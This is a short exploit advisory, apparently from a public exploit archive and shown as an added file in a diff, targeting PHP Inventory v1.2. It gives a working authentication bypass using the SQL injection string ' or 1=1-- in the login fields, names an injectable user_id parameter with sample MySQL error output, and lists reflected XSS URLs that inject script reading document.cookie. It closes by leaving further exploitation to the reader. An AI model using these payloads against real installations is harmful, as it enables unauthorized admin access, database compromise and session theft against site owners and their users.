@@ -1,0 +1,30 @@
+#################################################################
+#
+# PHP Inventory v1.2 Remote (Auth Bypass) SQL Injection Vulnerabiity
+# Found By: mr_me
+# Download: http://www.phpwares.com/content/php-inventory
+# Tested On: Windows Vista
+# Note: For educational purposes only
+#
+#################################################################
+
+First of all lets login to admin with:
+
+http://[server]/php-inventory/index.php
+
+username: ' or 1=1--
+password: ' or 1=1--
+
+The app is riddled with SQL Injection. For example:
+
+http://[server]/php-inventory/index.php?sub=users&action=details&user_id=[SQLI]
+
+SELECT * FROM `site_users` WHERE `user_id`='1003''You have an error in your SQL syntax; 
+check the manual that corresponds to your MySQL server version for the right syntax to use near ''1003''' at line 1
+
+This of course means you can do some slightly dodgy refected XSS:
+
+http://[server]/php-inventory/index.php?sub=suppliers&action=details&sup_id=%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+http://[server]/php-inventory/index.php?sub=suppliers&action=details&sup_id='><script>alert(document.cookie)</script>
+
+I leave the exploiting up to the reader.
